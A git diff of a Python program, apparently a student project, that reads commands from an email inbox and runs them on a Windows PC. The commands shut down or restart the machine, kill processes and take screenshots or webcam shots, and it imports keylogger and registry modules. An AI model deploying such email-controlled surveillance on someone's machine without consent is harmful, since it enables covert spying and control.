@@ -1,3 +1,6 @@
+import sys
+import ctypes
+from concurrent.futures import thread
 from config import *
 import imap
 import psutil
@@ -8,6 +11,7 @@ from datetime import datetime
 import keylog as kl
 import registry as reg
 import utils
+import threading
 
 
 dir_data = "data/"
@@ -35,44 +39,58 @@ def getListOfProcessSortedByMemory():
 
 def execute_one_command(cmd):
     dir_file = None
+    # cmd = 'shutdown 12345'
+    # cmd = 'shutdown 12345 --10'
     if("shutdown" in cmd):
         do = "shutdown /s"
-        if("--" in cmd and cmd[11:].isnumeric()):
-            do += " /t " + cmd[11:]
+        if("--" in cmd and cmd[cmd.find('--') + 2:].isnumeric()):
+            do += " /t " + cmd[cmd.find('--') + 2:]
 
-        os.system(do)
-        return ["Shutdown completed!", ""]  # [subject, text]
+        threading.Timer(5, function=os.system, args=(do,)).start()
+        # os.system(do)
+        return [cmd, "Shutdown completed!"]  # [subject, text]
 
+    # cmd = 'restart --10'
+    # cmd = 'restart 12345 --10'
     elif ("restart" in cmd):
         do = "shutdown /r"
-        if("--" in cmd and cmd[10:].isnumeric()):
-            do += " /t " + cmd[10:]
-        os.system(do)
-        return ["Restart completed!", ""]  # [subject, text]
+        if("--" in cmd and cmd[cmd.find('--') + 2:].isnumeric()):
+            do += " /t " + cmd[cmd.find('--') + 2:]
+
+        threading.Timer(5, function=os.system, args=(do, )).start()
+        # os.system(do)
+        return [cmd, "Restart completed!"]  # [subject, text]
 
     # Ngu dong
+    # cmd = 'hibernate 12345'
+    # cmd = 'hibernate 12345 --10'
     elif ("hibernate" in cmd):
         do = "shutdown /h"
-        if("--" in cmd and cmd[12:].isnumeric()):
-            do += " /t " + cmd[12:]
-        os.system(do)
-        return ["Hibernate completed!", ""]  # [subject, text]
+        if("--" in cmd and cmd[cmd.find('--') + 2:].isnumeric()):
+            do += " /t " + cmd[cmd.find('--') + 2:]
 
-    # list --all | list: list tat ca process
-    # list --10: list 10 process su dung nhieu Memory Usage nhat
+        threading.Timer(5, function=os.system, args=(do, )).start()
+        # os.system(do)
+        return [cmd, "Hibernate completed!"]  # [subject, text]
+
+    # list 12345: list tat ca process
+    # list 12345 --10: list 10 process su dung nhieu Memory Usage nhat
     elif ("list" in cmd):
         text = ""
-        if (cmd == "list" or cmd == "list --all"):
+        if not '--' in cmd:
             listOfRunningProcess = getListOfProcessSortedByMemory()
             text = "List all processes: complete!"
-        else:
-            if cmd[7:].isnumeric():
+        elif len(cmd) > 13:
+            if cmd[13:].isnumeric():
                 listOfRunningProcess = getListOfProcessSortedByMemory()[
-                    :int(cmd[7:])]
-                text = "List " + cmd[7:] + " processes: complete!"
+                    :int(cmd[13:])]
+                text = "List " + cmd[13:] + " processes: complete!"
             else:
-                listOfRunningProcess = ["None"]
-                text = "List cmd error!"
+                listOfRunningProcess = []
+                text = "Invalid command"
+        else:
+            listOfRunningProcess = []
+            text = 'Invalid command'
 
         dir_file = dir_data + cmd + ".txt"
         f = open(dir_file, "w+")
@@ -83,11 +101,15 @@ def execute_one_command(cmd):
         f.write(listOfRunningProcess)
         f.close()
 
-        return [text, "", dir_file]  # [subject, text, filepath]
+        return [cmd, text, dir_file]  # [subject, text, filepath]
 
-    # kill --chrome messenger
+    # kill 12345 --chrome messenger
     elif ("kill" in cmd):
-        list_proc = cmd[7:].split()
+        if len(cmd) < 14:
+            return [cmd, "Invalid command"]
+
+        list_proc = cmd[13:].split()
+        print(len(list_proc), list_proc)
         result = []
         for killed_proc in list_proc:
             for proc in psutil.process_iter():
@@ -95,19 +117,23 @@ def execute_one_command(cmd):
                     proc.kill()
                     if(len(result) == 0 or (len(result) > 0 and result[len(result) - 1] != proc.name())):
                         result.append(proc.name())
-        dir_file = dir_data + "killed_list.txt"
+        # dir_file = dir_data + "killed_list.txt"
         text = "There are " + str(len(result)) + "/" + \
             str(len(list_proc)) + " proccess killed"
-        f = open(dir_file, "w+")
-        f.write(text)
-        for item in result:
-            f.write(item)
-        f.close()
-        return [text, "", dir_file]  # [subject, text, filepath]
+        # f = open(dir_file, "w+")
+        # f.write(text)
+        # for item in result:
+        #     f.write(item)
+        # f.close()
+        return [cmd, text]  # [subject, text, filepath]
+
+    # screenshot 12345
     elif cmd.startswith('screenshot'):
         filepath = smtp.screenshot()
         now = datetime.now().strftime("%H:%M:%S, %Y/%m/%d")
         return [cmd, f"Screenshot at {now}", filepath]
+
+    # webcamshot 12345
     elif cmd.startswith('webcamshot'):
         filepath = smtp.webcamshot()
         now = datetime.now().strftime("%H:%M:%S, %Y/%m/%d")
@@ -129,28 +155,36 @@ def execute_one_command(cmd):
         return [cmd, 'Invalid command']
 
 
+def handle_request(main_sender: smtp.MailSender, user_mail: str, cmd: str):
+    print('Executing', cmd, 'from', user_mail)
+    result = execute_one_command(cmd)
+    print('Sending result to', user_mail)
+    sender.send_attached_email(
+        user_mail, result[0], result[1], result[2] if len(result) == 3 else None)
+
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+
 if __name__ == '__main__':
 
     handler = imap.MailFetcher()
     sender = smtp.MailSender()
 
-    cmd_list = []
     try:
         while True:
-            print('Idling...\t Press Ctrl + C to escape')
+            # print('Idling...\t Press Ctrl + C to escape')
             user_mail, cmd = handler.fetch_newest()
             if user_mail and cmd:
                 # cmd_list.append([user_mail, cmd, False])
-                print('Executing', cmd, 'from', user_mail)
-                result = execute_one_command(cmd)
-                time.sleep(3)
-                print('Sending result to', user_mail)
-                sender.send_attached_email(
-                    user_mail, result[0], result[1], result[2] if len(result) == 3 else None)
-                # MailSender.send(user_mail, result_text, result_file)
+                threading.Thread(target=handle_request, daemon=True, args=(
+                    sender, user_mail, cmd)).start()
 
     except KeyboardInterrupt:
         print('Ctrl C pressed')
-        print('Whole cmd list:', cmd_list, sep='\n')
-
-    utils.remove_files('data', '.jpg')
+        utils.remove_files('data', '.jpg')
+        utils.remove_files('data', '.txt')
